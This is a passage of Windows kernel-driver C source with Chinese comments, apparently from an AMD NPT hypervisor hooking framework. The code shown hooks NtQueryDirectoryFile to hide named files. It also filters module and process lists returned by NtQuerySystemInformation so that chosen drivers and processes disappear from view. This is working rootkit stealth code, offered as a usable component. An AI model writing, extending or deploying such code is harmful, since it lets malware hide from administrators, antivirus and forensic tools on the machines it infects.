    }
    
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) baseName++; else baseName = FileName;
    
    len = wcslen(baseName);
    if (len == 0 || len >= MAX_NPT_FILE_NAME_LEN) {
        return STATUS_INVALID_PARAMETER;
    }
    
    KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    
    for (ULONG i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], baseName) == 0) {
            KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
            return STATUS_SUCCESS;
        }
    }
    
    if (g_NptHiddenFileCount < MAX_NPT_HIDDEN_FILES) {
        wcscpy_s(g_NptHiddenFileNames[g_NptHiddenFileCount], MAX_NPT_FILE_NAME_LEN, baseName);
        g_NptHiddenFileCount++;
        KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

NTSTATUS
NptHookUnhideFile(
    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    BOOLEAN found = FALSE;
    
    if (!FileName || !g_NptHiddenFileLockInit) {
        return STATUS_INVALID_PARAMETER;
    }
    
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) baseName++; else baseName = FileName;
    
    KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    
    for (ULONG i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], baseName) == 0) {
            for (ULONG j = i; j < g_NptHiddenFileCount - 1; j++) {
                wcscpy_s(g_NptHiddenFileNames[j], MAX_NPT_FILE_NAME_LEN, g_NptHiddenFileNames[j + 1]);
            }
            g_NptHiddenFileNames[g_NptHiddenFileCount - 1][0] = L'\0';
            g_NptHiddenFileCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS
NptHookInstallFileHideHook(VOID)
{
    UNICODE_STRING funcName;
    PVOID ntQueryDirFile;
    
    RtlInitUnicodeString(&funcName, L"NtQueryDirectoryFile");
    ntQueryDirFile = MmGetSystemRoutineAddress(&funcName);
    
    if (!ntQueryDirFile) {
        return STATUS_NOT_FOUND;
    }

    return NptHookInstallFileHideHookAtAddress(ntQueryDirFile);
}

NTSTATUS
NptHookInstallFileHideHookAtAddress(
    _In_ PVOID NtQueryDirectoryFileAddress
)
{
    NTSTATUS status;

    if (!NtQueryDirectoryFileAddress) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_NptHiddenFileLockInit) {
        DbgPrint("[NPT-Hook] Warning: File hide lock not initialized\n");
        return STATUS_NOT_INITIALIZED;
    }
    if (g_NptQueryDirFileHook != NULL) {
        return g_NptOriginalQueryDirFile
            ? STATUS_SUCCESS
            : STATUS_DEVICE_NOT_READY;
    }

    status = NptHookInstall(
        NtQueryDirectoryFileAddress,
        NptHookedNtQueryDirectoryFile,
        &g_NptQueryDirFileHook
    );
    
    if (NT_SUCCESS(status)) {
        g_NptOriginalQueryDirFile = 
            (PFN_NptNtQueryDirectoryFile)NptHookGetTrampoline(g_NptQueryDirFileHook);
        if (!g_NptQueryDirFileHook || !g_NptOriginalQueryDirFile) {
            if (g_NptQueryDirFileHook) {
                (void)NptHookRemove(g_NptQueryDirFileHook);
                g_NptQueryDirFileHook = NULL;
            }
            g_NptOriginalQueryDirFile = NULL;
            return STATUS_DEVICE_NOT_READY;
        }
    }
    
    return status;
}

NTSTATUS
NptHookRemoveFileHideHook(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;

    if (g_NptQueryDirFileHook) {
        status = NptHookRemove(g_NptQueryDirFileHook);
        if (NT_SUCCESS(status)) {
            g_NptQueryDirFileHook = NULL;
            InterlockedExchangePointer(
                (PVOID volatile *)&g_NptOriginalQueryDirFile,
                NULL);
        }
    }
    return status;
}

// ============================================================
// 驱动隐藏功能 (AMD NPT)
// ============================================================

// 驱动隐藏相关全局变量
#define MAX_NPT_HIDDEN_DRIVERS 32
#define MAX_NPT_DRIVER_NAME_LEN 128

static WCHAR g_NptHiddenDriverNames[MAX_NPT_HIDDEN_DRIVERS][MAX_NPT_DRIVER_NAME_LEN];
static WCHAR g_NptHiddenDriverServiceNames[MAX_NPT_HIDDEN_DRIVERS][MAX_NPT_DRIVER_NAME_LEN];
static PVOID g_NptHiddenDriverBases[MAX_NPT_HIDDEN_DRIVERS];
static ULONG g_NptHiddenDriverSizes[MAX_NPT_HIDDEN_DRIVERS];
static ULONG g_NptHiddenDriverCount = 0;
static KSPIN_LOCK g_NptHiddenDriverLock;
static volatile LONG g_NptHiddenDriverLockInit = 0;

// 驱动隐藏 Hook 句柄
static PNPT_HOOK_ENTRY g_NptDriverQueryHook = NULL;

// 原始 ZwQuerySystemInformation (用于驱动隐藏)
static PFN_NptNtQuerySystemInformation g_NptOriginalQueryForDrivers = NULL;

// RTL_PROCESS_MODULE_INFORMATION 已在 HvTypes.h 中定义
// 使用别名保持兼容性
typedef HV_RTL_PROCESS_MODULE_INFORMATION NPT_RTL_PROCESS_MODULE_INFORMATION;
typedef PHV_RTL_PROCESS_MODULE_INFORMATION PNPT_RTL_PROCESS_MODULE_INFORMATION;
typedef HV_RTL_PROCESS_MODULES NPT_RTL_PROCESS_MODULES;
typedef PHV_RTL_PROCESS_MODULES PNPT_RTL_PROCESS_MODULES;

/*
 * 检查驱动是否应该被隐藏（通过基址）
 */
static BOOLEAN
NptIsDriverHidden(
    _In_ PVOID DriverBase
)
{
    if (g_NptHiddenDriverCount == 0 || !g_NptHiddenDriverLockInit) {
        return FALSE;
    }
    
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == DriverBase) {
            return TRUE;
        }
    }
    
    return FALSE;
}

/*
 * 检查驱动是否应该被隐藏（通过名称）
 */
static BOOLEAN
NptIsDriverNameHidden(
    _In_ PCSTR DriverName
)
{
    ANSI_STRING ansiName;
    UNICODE_STRING uniName;
    WCHAR uniBuffer[MAX_NPT_DRIVER_NAME_LEN];
    NTSTATUS status;
    
    if (g_NptHiddenDriverCount == 0 || !DriverName || !g_NptHiddenDriverLockInit) {
        return FALSE;
    }
    
    RtlInitAnsiString(&ansiName, DriverName);
    uniName.Buffer = uniBuffer;
    uniName.Length = 0;
    uniName.MaximumLength = sizeof(uniBuffer);
    
    status = RtlAnsiStringToUnicodeString(&uniName, &ansiName, FALSE);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (_wcsicmp(g_NptHiddenDriverNames[i], uniBuffer) == 0) {
            return TRUE;
        }
    }
    
    return FALSE;
}

/*
 * 过滤模块列表（驱动隐藏）
 */
static VOID
NptFilterModuleList(
    _Inout_ PNPT_RTL_PROCESS_MODULES ModuleInfo
)
{
    ULONG originalCount;
    ULONG newCount = 0;
    ULONG i;
    
    if (!ModuleInfo || ModuleInfo->NumberOfModules == 0) {
        return;
    }
    
    originalCount = ModuleInfo->NumberOfModules;
    
    __try {
        for (i = 0; i < originalCount; i++) {
            PNPT_RTL_PROCESS_MODULE_INFORMATION module = &ModuleInfo->Modules[i];
            PCSTR fileName = (PCSTR)(module->FullPathName + module->OffsetToFileName);
            
            // 检查是否需要隐藏
            if (NptIsDriverHidden(module->ImageBase) || NptIsDriverNameHidden(fileName)) {
                // 跳过这个模块
                continue;
            }
            
            // 如果需要移动条目
            if (newCount != i) {
                RtlCopyMemory(&ModuleInfo->Modules[newCount], module, 
                    sizeof(NPT_RTL_PROCESS_MODULE_INFORMATION));
            }
            newCount++;
        }
        
        ModuleInfo->NumberOfModules = newCount;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in NptFilterModuleList\n");
    }
}

VOID
NptHookFilterModuleList(
    _Inout_updates_bytes_(ModuleInfoLength) PVOID ModuleInfo,
    _In_ ULONG ModuleInfoLength
)
{
    ULONG count;
    ULONG capacity;

    if (!ModuleInfo || ModuleInfoLength < sizeof(ULONG)) {
        return;
    }

    count = ((PNPT_RTL_PROCESS_MODULES)ModuleInfo)->NumberOfModules;
    capacity = (ModuleInfoLength - sizeof(ULONG)) /
        sizeof(NPT_RTL_PROCESS_MODULE_INFORMATION);
    if (count > capacity) {
        return;
    }

    NptFilterModuleList((PNPT_RTL_PROCESS_MODULES)ModuleInfo);
}

/*
 * Hooked ZwQuerySystemInformation 用于驱动隐藏
 */
static NTSTATUS
NTAPI
NptHookedQueryForDrivers(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status;
    PFN_NptNtQuerySystemInformation originalFunc;
    
    originalFunc = g_NptOriginalQueryForDrivers;
    if (!originalFunc) {
        // 回退到使用进程隐藏的原始函数
        originalFunc = g_NptOriginalNtQuerySystemInformation;
        if (!originalFunc) {
            return STATUS_UNSUCCESSFUL;
        }
    }
    
    __try {
        status = originalFunc(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // SystemModuleInformation = 11
    if (NT_SUCCESS(status) && SystemInformationClass == 11 && 
        SystemInformation != NULL && g_NptHiddenDriverCount > 0) {
        
        __try {
            NptFilterModuleList((PNPT_RTL_PROCESS_MODULES)SystemInformation);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    // 也处理进程隐藏 (SystemProcessInformation = 5)
    if (NT_SUCCESS(status) && SystemInformationClass == 5 && 
        SystemInformation != NULL && g_NptHiddenProcessCount > 0) {
        
        __try {
            NptFilterProcessList(SystemInformation);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    return status;
}

/*
 * 安装驱动隐藏 Hook
 */
NTSTATUS
NptHookInstallDriverHideHook(VOID)
{
    DbgPrint("[NPT-Hook] Installing Driver Hide Hook...\n");
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    /*
     * NtQuerySystemInformation is shared by process/debugger/driver hiding.
     * Installing a second NPT hook here races the common hook and used to
     * leave two owners with independent trampolines.  HvHook now owns the
     * single interception and calls NptHookFilterModuleList for class 11.
     */
    DbgPrint("[NPT-Hook] Driver-hide backend ready; shared NtQSI hook owned by HvHook\n");
    return STATUS_SUCCESS;
}

/*
 * 移除驱动隐藏 Hook
 */
NTSTATUS
NptHookRemoveDriverHideHook(VOID)
{
    DbgPrint("[NPT-Hook] Removing Driver Hide Hook...\n");

    /* Compatibility cleanup for a hook left by an older initialization. */
    if (g_NptDriverQueryHook) {
        NTSTATUS status = NptHookRemove(g_NptDriverQueryHook);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        g_NptDriverQueryHook = NULL;
        InterlockedExchangePointer(
            (PVOID volatile *)&g_NptOriginalQueryForDrivers,
            NULL);
    }
    
    return STATUS_SUCCESS;
}

/*
 * 隐藏指定驱动
 */
NTSTATUS
NptHookHideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    UNICODE_STRING driverName;
    PKLDR_DATA_TABLE_ENTRY entry;
    PVOID driverBase;
    ULONG driverSize;
    
    if (!DriverObject) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    // 获取驱动信息
    entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) {
        DbgPrint("[NPT-Hook] Failed to get driver section\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    driverBase = entry->DllBase;
    driverSize = entry->SizeOfImage;
    driverName = entry->BaseDllName;
    
    DbgPrint("[NPT-Hook] Hiding driver: %wZ at %p (size: 0x%X)\n", 
        &driverName, driverBase, driverSize);
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
    // 检查是否已经隐藏
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == driverBase) {
            KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
            DbgPrint("[NPT-Hook] Driver already hidden\n");
            return STATUS_SUCCESS;
        }
    }
    
    // 添加到隐藏列表
    if (g_NptHiddenDriverCount < MAX_NPT_HIDDEN_DRIVERS) {
        ULONG index = g_NptHiddenDriverCount;
        
        g_NptHiddenDriverBases[index] = driverBase;
        g_NptHiddenDriverSizes[index] = driverSize;
        
        if (driverName.Buffer && driverName.Length > 0) {
            SIZE_T copyLen = min(driverName.Length / sizeof(WCHAR), MAX_NPT_DRIVER_NAME_LEN - 1);
            RtlCopyMemory(g_NptHiddenDriverNames[index], driverName.Buffer, copyLen * sizeof(WCHAR));
            g_NptHiddenDriverNames[index][copyLen] = L'\0';
        }
        
        g_NptHiddenDriverCount++;
        
        KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
        
        DbgPrint("[NPT-Hook] Driver added to hidden list (total: %d)\n", g_NptHiddenDriverCount);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 根据名称隐藏驱动
 */
NTSTATUS
NptHookHideDriverByName(
    _In_ PCWSTR DriverName
)
{
    KIRQL oldIrql;
    SIZE_T len;
    
    if (!DriverName || DriverName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    len = wcslen(DriverName);
    if (len >= MAX_NPT_DRIVER_NAME_LEN) {
        return STATUS_INVALID_PARAMETER;
    }
    
    DbgPrint("[NPT-Hook] Hiding driver by name: %ws\n", DriverName);
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
    // 检查是否已经隐藏
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (_wcsicmp(g_NptHiddenDriverNames[i], DriverName) == 0) {
            KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
            return STATUS_SUCCESS;
        }
    }
    
    // 添加到隐藏列表
    if (g_NptHiddenDriverCount < MAX_NPT_HIDDEN_DRIVERS) {
        ULONG index = g_NptHiddenDriverCount;
        
        wcscpy_s(g_NptHiddenDriverNames[index], MAX_NPT_DRIVER_NAME_LEN, DriverName);
        g_NptHiddenDriverBases[index] = NULL;  // 将在实际查询时匹配
        g_NptHiddenDriverSizes[index] = 0;
        
        g_NptHiddenDriverCount++;
        
        KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 取消隐藏指定驱动
 */
NTSTATUS
NptHookUnhideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    PKLDR_DATA_TABLE_ENTRY entry;
    PVOID driverBase;
    BOOLEAN found = FALSE;
    
    if (!DriverObject || !g_NptHiddenDriverLockInit) {
        return STATUS_INVALID_PARAMETER;
    }
    
    entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) {
        return STATUS_UNSUCCESSFUL;
    }
    
    driverBase = entry->DllBase;
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == driverBase) {
            // 移动后续条目
            for (ULONG j = i; j < g_NptHiddenDriverCount - 1; j++) {
                g_NptHiddenDriverBases[j] = g_NptHiddenDriverBases[j + 1];
                g_NptHiddenDriverSizes[j] = g_NptHiddenDriverSizes[j + 1];
                wcscpy_s(g_NptHiddenDriverNames[j], MAX_NPT_DRIVER_NAME_LEN, 
                    g_NptHiddenDriverNames[j + 1]);
            }
            
            g_NptHiddenDriverCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}
